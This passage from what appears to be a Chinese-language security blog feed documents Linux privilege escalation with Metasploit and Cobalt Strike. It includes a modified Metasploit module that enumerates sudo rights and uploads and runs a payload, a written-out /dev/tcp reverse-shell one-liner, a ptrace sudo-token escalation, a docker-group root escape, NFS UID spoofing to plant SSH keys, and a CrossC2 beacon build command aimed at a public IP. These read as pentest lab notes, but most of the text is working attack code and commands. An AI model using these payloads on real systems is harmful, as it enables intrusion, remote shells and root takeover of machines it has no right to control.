cmd.split(<span class="hljs-regexp">/\s/</span>).first<br><br>    <span class="hljs-keyword">if</span> cmd.eql? <span class="hljs-string">&#x27;ALL&#x27;</span><br>      print_good <span class="hljs-string">&#x27;sudo any command!&#x27;</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>    <span class="hljs-keyword">end</span><br><br>    base_dir  = File.dirname cmd<br>    base_name = File.basename cmd<br><br>    <span class="hljs-keyword">if</span> file_exist? cmd<br>      <span class="hljs-keyword">if</span> writable? cmd<br>        print_good <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;cmd&#125;</span> is writable!&quot;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>      <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">elsif</span> writable? base_dir<br>      print_good <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;cmd&#125;</span> does not exist and <span class="hljs-subst">#&#123;base_dir&#125;</span> is writable!&quot;</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>    <span class="hljs-keyword">end</span><br><br>    <span class="hljs-keyword">if</span> eop_bins.<span class="hljs-keyword">include</span>? base_name<br>      print_good <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;cmd&#125;</span> matches known privesc executable &#x27;<span class="hljs-subst">#&#123;base_name&#125;</span>&#x27; !&quot;</span>  <span class="hljs-comment">#shell session type executing sudo ash command</span><br>      <span class="hljs-keyword">if</span> cmd.start_with? <span class="hljs-string">&#x27;/bin/ash&#x27;</span><br>        cmd_exec(<span class="hljs-string">&quot;sudo ash&quot;</span>)  <br>        print_good <span class="hljs-string">&quot;executing sudo ash&quot;</span><br>        <span class="hljs-comment">#print_good &quot;spawn new meterpreter session...&quot;</span><br>        <span class="hljs-comment">#<span class="hljs-doctag">@payload</span>_path = &quot;#&#123;base_dir&#125;/.#&#123;rand_text_alphanumeric 10..15&#125;&quot;</span><br>        <span class="hljs-comment">#upload <span class="hljs-doctag">@payload</span>_path, generate_payload_exe</span><br>        <span class="hljs-comment">#res = cmd_exec &quot;#&#123;<span class="hljs-doctag">@payload</span>_path&#125; &amp; echo &quot;</span><br>        <span class="hljs-comment">#vprint_line res</span><br>      <span class="hljs-keyword">else</span><br>        puts <span class="hljs-string">&quot;/bin/ash not found!&quot;</span><br>      <span class="hljs-keyword">end</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>    <span class="hljs-keyword">end</span><br><br>    <span class="hljs-literal">false</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-comment">#</span><br>  <span class="hljs-comment"># Retrieve list of sudo commands for current session user</span><br>  <span class="hljs-comment">#</span><br>  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sudo_list</span></span><br>    <span class="hljs-comment"># try non-interactive (-n) without providing a password</span><br>    cmd = <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;sudo_path&#125;</span> -n -l&quot;</span><br>    vprint_status <span class="hljs-string">&quot;Executing: <span class="hljs-subst">#&#123;cmd&#125;</span>&quot;</span><br>    output = cmd_exec(cmd).to_s<br><br>    <span class="hljs-keyword">if</span> output.start_with?(<span class="hljs-string">&#x27;usage:&#x27;</span>) <span class="hljs-params">||</span> output.<span class="hljs-keyword">include</span>?(<span class="hljs-string">&#x27;illegal option&#x27;</span>) <span class="hljs-params">||</span> output.<span class="hljs-keyword">include</span>?(<span class="hljs-string">&#x27;a password is required&#x27;</span>)<br>      <span class="hljs-comment"># try with a password from stdin (-S)</span><br>      cmd = <span class="hljs-string">&quot;echo <span class="hljs-subst">#&#123;password&#125;</span> | <span class="hljs-subst">#&#123;sudo_path&#125;</span> -S -l&quot;</span><br>      vprint_status <span class="hljs-string">&quot;Executing: <span class="hljs-subst">#&#123;cmd&#125;</span>&quot;</span><br>      output = cmd_exec(cmd).to_s<br>    <span class="hljs-keyword">end</span><br><br>    output<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-comment">#</span><br>  <span class="hljs-comment"># Format sudo output and extract permitted commands</span><br>  <span class="hljs-comment">#</span><br>  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">parse_sudo</span><span class="hljs-params">(sudo_data)</span></span><br>    cmd_data = sudo_data.scan(<span class="hljs-regexp">/may run the following commands.*?$(.*)\z/m</span>).flatten.first<br><br>    <span class="hljs-comment"># remove leading whitespace from each line and remove linewraps</span><br>    formatted_data = <span class="hljs-string">&#x27;&#x27;</span><br>    cmd_data.split(<span class="hljs-string">&quot;\n&quot;</span>).reject &#123; <span class="hljs-params">|line|</span> line.eql?(<span class="hljs-string">&#x27;&#x27;</span>) &#125;.each <span class="hljs-keyword">do</span> <span class="hljs-params">|line|</span><br>      formatted_line = line.gsub(<span class="hljs-regexp">/^\s*/</span>, <span class="hljs-string">&#x27;&#x27;</span>).to_s<br>      <span class="hljs-keyword">if</span> formatted_line.start_with? <span class="hljs-string">&#x27;(&#x27;</span><br>        formatted_data &lt;&lt; <span class="hljs-string">&quot;\n<span class="hljs-subst">#&#123;formatted_line&#125;</span>&quot;</span><br>      <span class="hljs-keyword">else</span><br>        formatted_data &lt;&lt; <span class="hljs-string">&quot; <span class="hljs-subst">#&#123;formatted_line&#125;</span>&quot;</span><br>      <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">end</span><br><br>    formatted_data.split(<span class="hljs-string">&quot;\n&quot;</span>).reject &#123; <span class="hljs-params">|line|</span> line.eql?(<span class="hljs-string">&#x27;&#x27;</span>) &#125;.each <span class="hljs-keyword">do</span> <span class="hljs-params">|line|</span><br>      run_as = line.scan(<span class="hljs-regexp">/^\((.+?)\)/</span>).flatten.first<br><br>      <span class="hljs-keyword">if</span> run_as.blank?<br>        print_warning <span class="hljs-string">&quot;Could not parse sudoers entry: <span class="hljs-subst">#&#123;line.inspect&#125;</span>&quot;</span><br>        <span class="hljs-keyword">next</span><br>      <span class="hljs-keyword">end</span><br><br>      user = run_as.split(<span class="hljs-string">&#x27;:&#x27;</span>)[<span class="hljs-number">0</span>].to_s.strip <span class="hljs-params">||</span> <span class="hljs-string">&#x27;&#x27;</span><br>      group = run_as.split(<span class="hljs-string">&#x27;:&#x27;</span>)[<span class="hljs-number">1</span>].to_s.strip <span class="hljs-params">||</span> <span class="hljs-string">&#x27;&#x27;</span><br>      no_passwd = <span class="hljs-literal">false</span><br><br>      cmds = line.scan(<span class="hljs-regexp">/^\(.+?\) (.+)$/</span>).flatten.first<br>      <span class="hljs-keyword">if</span> cmds.start_with? <span class="hljs-string">&#x27;NOPASSWD:&#x27;</span><br>        no_passwd = <span class="hljs-literal">true</span><br>        cmds = cmds.gsub(<span class="hljs-regexp">/^NOPASSWD:\s*/</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>      <span class="hljs-keyword">end</span><br><br>      <span class="hljs-comment"># Commands are separated by commas but may also contain commas (escaped with a backslash)</span><br>      <span class="hljs-comment"># so we temporarily replace escaped commas with some junk</span><br>      <span class="hljs-comment"># later, we&#x27;ll replace each instance of the junk with a comma</span><br>      junk = Rex::Text.rand_text_alpha(<span class="hljs-number">10</span>)<br>      cmds = cmds.gsub(<span class="hljs-string">&#x27;\, &#x27;</span>, junk)<br><br>      cmds.split(<span class="hljs-string">&#x27;, &#x27;</span>).each <span class="hljs-keyword">do</span> <span class="hljs-params">|cmd|</span><br>        cmd = cmd.gsub(junk, <span class="hljs-string">&#x27;, &#x27;</span>).strip<br><br>        <span class="hljs-keyword">if</span> cmd.start_with? <span class="hljs-string">&#x27;(&#x27;</span><br>          run_as = cmd.scan(<span class="hljs-regexp">/^\((.+?)\)/</span>).flatten.first<br><br>          <span class="hljs-keyword">if</span> run_as.blank?<br>            print_warning <span class="hljs-string">&quot;Could not parse sudo command: <span class="hljs-subst">#&#123;cmd.inspect&#125;</span>&quot;</span><br>            <span class="hljs-keyword">next</span><br>          <span class="hljs-keyword">end</span><br><br>          user = run_as.split(<span class="hljs-string">&#x27;:&#x27;</span>)[<span class="hljs-number">0</span>].to_s.strip <span class="hljs-params">||</span> <span class="hljs-string">&#x27;&#x27;</span><br>          group = run_as.split(<span class="hljs-string">&#x27;:&#x27;</span>)[<span class="hljs-number">1</span>].to_s.strip <span class="hljs-params">||</span> <span class="hljs-string">&#x27;&#x27;</span><br>          cmd = cmd.scan(<span class="hljs-regexp">/^\(.+?\) (.+)$/</span>).flatten.first<br>        <span class="hljs-keyword">end</span><br><br>        msg = <span class="hljs-string">&quot;Command: <span class="hljs-subst">#&#123;cmd.inspect&#125;</span>&quot;</span><br>        msg &lt;&lt; <span class="hljs-string">&quot; RunAsUsers: <span class="hljs-subst">#&#123;user&#125;</span>&quot;</span> <span class="hljs-keyword">unless</span> user.eql? <span class="hljs-string">&#x27;&#x27;</span><br>        msg &lt;&lt; <span class="hljs-string">&quot; RunAsGroups: <span class="hljs-subst">#&#123;group&#125;</span>&quot;</span> <span class="hljs-keyword">unless</span> group.eql? <span class="hljs-string">&#x27;&#x27;</span><br>        msg &lt;&lt; <span class="hljs-string">&#x27; without providing a password&#x27;</span> <span class="hljs-keyword">if</span> no_passwd<br>        vprint_status msg<br><br>        eop = check_eop cmd<br><br>        <span class="hljs-variable">@results</span> &lt;&lt; [cmd, user, group, no_passwd ? <span class="hljs-string">&#x27;&#x27;</span> : <span class="hljs-string">&#x27;True&#x27;</span>, eop ? <span class="hljs-string">&#x27;True&#x27;</span> : <span class="hljs-string">&#x27;&#x27;</span>]<br>      <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">rescue</span> =&gt; e<br>    print_error <span class="hljs-string">&quot;Could not parse sudo ouput: <span class="hljs-subst">#&#123;e.message&#125;</span>&quot;</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exploit</span></span><br>        <span class="hljs-comment"># Upload payload</span><br>    print_good <span class="hljs-string">&quot;spawn new meterpreter session...&quot;</span><br>    <span class="hljs-variable">@payload_path</span> = <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;base_dir&#125;</span>/.<span class="hljs-subst">#&#123;rand_text_alphanumeric <span class="hljs-number">10</span>..<span class="hljs-number">15</span>&#125;</span>&quot;</span><br>    upload <span class="hljs-variable">@payload_path</span>, generate_payload_exe<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span></span><br>    <span class="hljs-keyword">if</span> is_root?<br>      fail_with Failure::BadConfig, <span class="hljs-string">&#x27;Session already has root privileges&#x27;</span><br>    <span class="hljs-keyword">end</span><br><br>    <span class="hljs-keyword">unless</span> is_executable? sudo_path<br>      print_error <span class="hljs-string">&#x27;Could not find sudo executable&#x27;</span><br>      <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">end</span><br><br>    output = sudo_list<br>    vprint_line output<br>    vprint_line<br><br>    <span class="hljs-keyword">if</span> output.<span class="hljs-keyword">include</span>? <span class="hljs-string">&#x27;Sorry, try again&#x27;</span><br>      fail_with Failure::NoAccess, <span class="hljs-string">&#x27;Incorrect password&#x27;</span><br>    <span class="hljs-keyword">end</span><br><br>    <span class="hljs-keyword">if</span> output =~ <span class="hljs-regexp">/^Sorry, .* may not run sudo/</span><br>      fail_with Failure::NoAccess, <span class="hljs-string">&#x27;Session user is not permitted to execute any commands with sudo&#x27;</span><br>    <span class="hljs-keyword">end</span><br><br>    <span class="hljs-keyword">if</span> output !~ <span class="hljs-regexp">/may run the following commands/</span><br>      fail_with Failure::NoAccess, <span class="hljs-string">&#x27;Incorrect password, or the session user is not permitted to execute any commands with sudo&#x27;</span><br>    <span class="hljs-keyword">end</span><br><br>    <span class="hljs-variable">@results</span> = Rex::Text::Table.new(<br>      <span class="hljs-string">&#x27;Header&#x27;</span>  =&gt; <span class="hljs-string">&#x27;Sudo Commands&#x27;</span>,<br>      <span class="hljs-string">&#x27;Indent&#x27;</span>  =&gt; <span class="hljs-number">2</span>,<br>      <span class="hljs-string">&#x27;Columns&#x27;</span> =&gt;<br>        [<br>          <span class="hljs-string">&#x27;Command&#x27;</span>,<br>          <span class="hljs-string">&#x27;RunAsUsers&#x27;</span>,<br>          <span class="hljs-string">&#x27;RunAsGroups&#x27;</span>,<br>          <span class="hljs-string">&#x27;Password?&#x27;</span>,<br>          <span class="hljs-string">&#x27;Privesc?&#x27;</span><br>        ]<br>    )<br><br>    parse_sudo output<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-variable">@results</span>.rows.empty?<br>      print_status <span class="hljs-string">&#x27;Found no sudo commands for the session user&#x27;</span><br>      <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">end</span><br><br>    print_line<br>    print_line <span class="hljs-variable">@results</span>.to_s<br><br>    path = store_loot(<br>      <span class="hljs-string">&#x27;sudo.commands&#x27;</span>,<br>      <span class="hljs-string">&#x27;text/csv&#x27;</span>,<br>      session,<br>      <span class="hljs-variable">@results</span>.to_csv,<br>      <span class="hljs-string">&#x27;sudo.commands.txt&#x27;</span>,<br>      <span class="hljs-string">&#x27;Sudo Commands&#x27;</span><br>    )<br><br>    print_good <span class="hljs-string">&quot;Output stored in: <span class="hljs-subst">#&#123;path&#125;</span>&quot;</span><br><br>    <span class="hljs-keyword">if</span> session.type.eql? <span class="hljs-string">&#x27;meterpreter&#x27;</span><br>      puts <span class="hljs-string">&quot;This sessions is meterpreter session.&quot;</span><br>      exploit     <br><br>      print_status <span class="hljs-string">&#x27;Executing payload...&#x27;</span><br>      res = cmd_exec <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;<span class="hljs-variable">@payload_path</span>&#125;</span> &amp; echo &quot;</span><br>      vprint_line res<br>    <span class="hljs-keyword">else</span><br>      puts <span class="hljs-string">&quot;maybe shell session types&quot;</span><br>      exploit<br>      print_status <span class="hljs-string">&#x27;Executing payload...&#x27;</span><br>      res = cmd_exec <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;<span class="hljs-variable">@payload_path</span>&#125;</span> &amp; echo &quot;</span><br>      vprint_line res<br>    <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">on_new_session</span><span class="hljs-params">(session)</span></span><br>    <span class="hljs-keyword">if</span> session.type.eql? <span class="hljs-string">&#x27;meterpreter&#x27;</span><br>      session.core.use <span class="hljs-string">&#x27;stdapi&#x27;</span> <span class="hljs-keyword">unless</span> session.ext.aliases.<span class="hljs-keyword">include</span>? <span class="hljs-string">&#x27;stdapi&#x27;</span><br>      session.fs.file.rm <span class="hljs-variable">@payload_path</span><br>    <span class="hljs-keyword">else</span><br>      session.shell_command_token <span class="hljs-string">&quot;rm -f &#x27;<span class="hljs-subst">#&#123;<span class="hljs-variable">@payload_path</span>&#125;</span>&#x27;&quot;</span><br>    <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">ensure</span><br>    <span class="hljs-keyword">super</span><br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br></code></pre></div></td></tr></table></figure><h2 id="参考的模块exploit-linux-local-ptrace-sudo-token-priv-esc"><a href="#参考的模块exploit-linux-local-ptrace-sudo-token-priv-esc" class="headerlink" title="参考的模块exploit/linux/local/ptrace_sudo_token_priv_esc"></a>参考的模块exploit/linux/local/ptrace_sudo_token_priv_esc</h2><h3 id="复现sudo令牌窃取提权——ptrace-Sudo-Token-Privilege-Escalation"><a href="#复现sudo令牌窃取提权——ptrace-Sudo-Token-Privilege-Escalation" class="headerlink" title="复现sudo令牌窃取提权——ptrace Sudo Token Privilege Escalation"></a>复现sudo令牌窃取提权——ptrace Sudo Token Privilege Escalation</h3><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p><a href="https://onestraw.github.io/linux/ptrace-hack/">https://onestraw.github.io/linux/ptrace-hack/</a></p><p>ptrace系统调从名字上看是用于进程跟踪的，它提供了父进程可以观察和控制其子进程执行的能力，并允许父进程检查和替换子进程的内核镜像(包括寄存器)的值。</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>echo 0 &gt; /proc/sys/kernel/yama/ptrace_scope</p><p>sudo ls</p><p>输入密码</p><p>普通用户输入sudo的密码，就可以使用exploit/linux/local/ptrace_sudo_token_priv_esc进行提权了。提权成功会返回一个root权限的meterpreter session</p><h3 id="下一步计划"><a href="#下一步计划" class="headerlink" title="下一步计划"></a>下一步计划</h3><p>重写new_session模块，添加提权函数</p>]]></content>
    
    
    <categories>
      
      <category>metasploit</category>
      
    </categories>
    
    
    <tags>
      
      <tag>metasploit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>03-msf报错（SESSION may not be compatible）</title>
    <link href="/2020/12/22/11-x/"/>
    <url>/2020/12/22/11-x/</url>
    
    <content type="html"><![CDATA[<h2 id="起因：sudo-s提权在msf上一直报错，但是在靶机上是可以成功提权的。"><a href="#起因：sudo-s提权在msf上一直报错，但是在靶机上是可以成功提权的。" class="headerlink" title="起因：sudo -s提权在msf上一直报错，但是在靶机上是可以成功提权的。"></a>起因：sudo -s提权在msf上一直报错，但是在靶机上是可以成功提权的。</h2><p>msf有一个模块，叫做<code>post/multi/manage/sudo</code></p><p>看过这个模块的源码，就是使用sudo -s来提权的。</p><p>为什么会提权失败呢？<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-22-11/4.PNG" alt="4"></p><h2 id="环境配置复现，debug"><a href="#环境配置复现，debug" class="headerlink" title="环境配置复现，debug"></a>环境配置复现，debug</h2><h3 id="设置msf监听"><a href="#设置msf监听" class="headerlink" title="设置msf监听"></a>设置msf监听</h3><p><code>handler -H 192.168.123.123 -P 6677 -p cmd/unix/reverse_bash</code></p><h3 id="生成反弹shell的载荷"><a href="#生成反弹shell的载荷" class="headerlink" title="生成反弹shell的载荷"></a>生成反弹shell的载荷</h3><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">msfvenom</span> -p cmd/unix/reverse_bash  lhost=<span class="hljs-number">192.168.123.123</span> lport=<span class="hljs-number">6677</span> -f raw      <br><br><span class="hljs-attribute">0</span>&lt;&amp;<span class="hljs-number">165</span>-;exec <span class="hljs-number">165</span>&lt;&gt;/dev/tcp/<span class="hljs-number">192.168.123.123</span>/<span class="hljs-number">6677</span>;sh &lt;&amp;<span class="hljs-number">165</span> &gt;&amp;<span class="hljs-number">165</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">165</span><br></code></pre></div></td></tr></table></figure><h3 id="设置metapreter-session"><a href="#设置metapreter-session" class="headerlink" title="设置metapreter session"></a>设置metapreter session</h3><p>使用上一条命令获得一个<code>shell cmd/unix</code>类型的shell以后，可以使用<code>session -u session的ID</code> 这种方式，获得一个<code>meterpreter x86/linux</code>的session。</p><p>使用meterpreter的session，执行<code>post/multi/manage/sudo</code>提权载荷，会报错。</p><figure class="highlight coffeescript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs coffeescript">[!] SESSION may <span class="hljs-keyword">not</span> be compatible <span class="hljs-keyword">with</span> <span class="hljs-built_in">this</span> <span class="hljs-built_in">module</span>.<br></code></pre></div></td></tr></table></figure><p>使用<code>shell cmd/unix</code>的载荷不会报错。</p><h3 id="查看源码"><a href="#查看源码" class="headerlink" title="查看源码"></a>查看源码</h3><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">vi <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/metasploit-framework/m</span>odules<span class="hljs-regexp">/post/mu</span>lti<span class="hljs-regexp">/manage/</span>sudo.rb<br><br>在第<span class="hljs-number">32</span>行，如果没有meterpreter这一个关键字，那么就只支持shell类型的session<br><br> <span class="hljs-string">&#x27;SessionTypes&#x27;</span>  =&gt; [ <span class="hljs-string">&#x27;meterpreter&#x27;</span>, <span class="hljs-string">&#x27;shell&#x27;</span> ]<br></code></pre></div></td></tr></table></figure><h3 id="如何写一个msf插件"><a href="#如何写一个msf插件" class="headerlink" title="如何写一个msf插件"></a>如何写一个msf插件</h3><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">##<br># This module requires Metasploit: https://metasploit.com/download<br># <span class="hljs-keyword">Current</span> source: https://github.com/rapid7/metasploit-framework<br>##<br><br><span class="hljs-keyword">class</span> MetasploitModule &lt; Msf::Post<br>  <span class="hljs-keyword">include</span> Msf::Post::Windows::WMIC<br><br>  def initialize(<span class="hljs-keyword">info</span>=&#123;&#125;)<br>    super( update_info( <span class="hljs-keyword">info</span>,<br>      <span class="hljs-string">&#x27;Name&#x27;</span>          =&gt; <span class="hljs-string">&#x27;Windows Gather Run Specified WMIC Command&#x27;</span>,<br>      <span class="hljs-string">&#x27;Description&#x27;</span>   =&gt; %q&#123; This module will <span class="hljs-keyword">execute</span> a given WMIC command <span class="hljs-keyword">options</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">read</span><br>        WMIC commands <span class="hljs-keyword">options</span> <span class="hljs-keyword">from</span> a resource file <span class="hljs-keyword">and</span> <span class="hljs-keyword">execute</span> the commands <span class="hljs-keyword">in</span> the<br>        specified Meterpreter <span class="hljs-keyword">session</span>.&#125;,<br>      <span class="hljs-string">&#x27;License&#x27;</span>       =&gt; MSF_LICENSE,<br>      <span class="hljs-string">&#x27;Author&#x27;</span>        =&gt; [ <span class="hljs-string">&#x27;Carlos Perez &lt;carlos_perez[at]darkoperator.com&gt;&#x27;</span>],<br>      <span class="hljs-string">&#x27;Platform&#x27;</span>      =&gt; [ <span class="hljs-string">&#x27;win&#x27;</span> ],<br>      <span class="hljs-string">&#x27;SessionTypes&#x27;</span>  =&gt; [ <span class="hljs-string">&#x27;meterpreter&#x27;</span> ]<br>    ))<br><br>    register_options(<br>      [<br>        OptPath.<span class="hljs-built_in">new</span>(<span class="hljs-string">&#x27;RESOURCE&#x27;</span>, [<span class="hljs-keyword">false</span>, <span class="hljs-string">&#x27;Full path to resource file to read commands from.&#x27;</span>]),<br>        OptString.<span class="hljs-built_in">new</span>(<span class="hljs-string">&#x27;COMMAND&#x27;</span>, [<span class="hljs-keyword">false</span>, <span class="hljs-string">&#x27;WMIC command options.&#x27;</span>]),<br>      ])<br>  <span class="hljs-keyword">end</span><br><br>  # Run <span class="hljs-keyword">Method</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">when</span> run command <span class="hljs-keyword">is</span> issued<br>  def run<br>        print_status(&quot;Executing command&quot;)<br>        command = wmic_query(&quot;useraccount get name&quot;)<br>        puts command<br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>metasploit</category>
      
    </categories>
    
    
    <tags>
      
      <tag>metasploit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux提权-msf提权插件编写中</title>
    <link href="/2020/12/20/11-x/"/>
    <url>/2020/12/20/11-x/</url>
    
    <content type="html"><![CDATA[<p>linux提权-msf提权插件编写中</p><p>bob / secret</p><h3 id="docker组提权"><a href="#docker组提权" class="headerlink" title="docker组提权"></a>docker组提权</h3><figure class="highlight arcade"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arcade">docker run -v /:<span class="hljs-regexp">/linsecurity -i -t chrisfosterelli/</span>rootplease<br></code></pre></div></td></tr></table></figure><h3 id="nsf提权"><a href="#nsf提权" class="headerlink" title="nsf提权"></a>nsf提权</h3><figure class="highlight gradle"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gradle">查看并挂载目录<br>showmount -e <span class="hljs-number">192.168</span>.<span class="hljs-number">1.140</span><br>mount <span class="hljs-number">192.168</span>.<span class="hljs-number">1.140</span>:<span class="hljs-regexp">/home/</span>peter <span class="hljs-regexp">/mnt/</span>peter<br><br>查看权限<br>ls -la <span class="hljs-regexp">/mnt/</span>peter<br>touch <span class="hljs-keyword">this</span>-wont-work<br><br>添加用户组和用户<br>groupadd --gid <span class="hljs-number">1005</span> peter<br>useradd --uid <span class="hljs-number">1001</span> --gid <span class="hljs-number">1005</span> peter<br>su peter<br>pwd<br>touch <span class="hljs-keyword">this</span>-will-work<br>ls -la<br><br>生成私钥<br>ssh-keygen<br>mkdir .ssh<br>ls -la <span class="hljs-regexp">/home/</span>peter/.ssh<br>cat <span class="hljs-regexp">/home/</span>peter<span class="hljs-regexp">/.ssh/i</span>d_rsa.pub &gt; .ssh/authorized_keys<br><br>获得普通用户权限<br>ssh peter@<span class="hljs-number">192.168</span>.<span class="hljs-number">1.140</span><br>whoami;id<br></code></pre></div></td></tr></table></figure><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><p><a href="https://s1gh.sh/lin-security/">https://s1gh.sh/lin-security/</a></p></li><li><p><a href="https://book.hacktricks.xyz/pentesting-methodology">https://book.hacktricks.xyz/pentesting-methodology</a></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cobaltstrike的脚本（四）</title>
    <link href="/2020/12/13/02-x/"/>
    <url>/2020/12/13/02-x/</url>
    
    <content type="html"><![CDATA[<h1 id="linux上线插件CrossC2"><a href="#linux上线插件CrossC2" class="headerlink" title="linux上线插件CrossC2"></a>linux上线插件CrossC2</h1><p><a href="https://www.bilibili.com/video/BV1Fy4y1B7VP">录制的视频： CobaltStrike的插件</a></p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-number">1</span>. src目录下，修改cna<br><span class="hljs-variable">$CC2_PATH</span><br><span class="hljs-variable">$CC2_BIN</span><br><br><span class="hljs-number">2</span>. 添加证书<br>.cobaltstrike.beacon_keys<br><br><span class="hljs-number">3</span>. <br>.<span class="hljs-regexp">/genCrossC2.Linux 18.163.137.185 6677 /</span>root<span class="hljs-regexp">/tool/</span>cobaltstrike<span class="hljs-regexp">/CrossC2-master/</span>.cobaltstrike.beacon_keys null Linux x64 test<br></code></pre></div></td></tr></table></figure><h2 id="windows辅助插件-梼杌"><a href="#windows辅助插件-梼杌" class="headerlink" title="windows辅助插件-梼杌"></a>windows辅助插件-梼杌</h2><p>具有信息搜集、提权、横向移动等功能。<br><a href="https://github.com/pandasec888/taowu-cobalt-strike">https://github.com/pandasec888/taowu-cobalt-strike</a></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://github.com/gloxec/CrossC2#customextension">https://github.com/gloxec/CrossC2#customextension</a></li><li><a href="https://www.cobaltstrike.com/help-scripting">https://www.cobaltstrike.com/help-scripting</a></li><li><a href="https://www.wangan.com/articles/1069">https://www.wangan.com/articles/1069</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>cobaltstrike</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cobaltstrike</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2021年学习计划</title>
    <link href="/2020/12/12/01-x/"/>
    <url>/2020/12/12/01-x/</url>
    
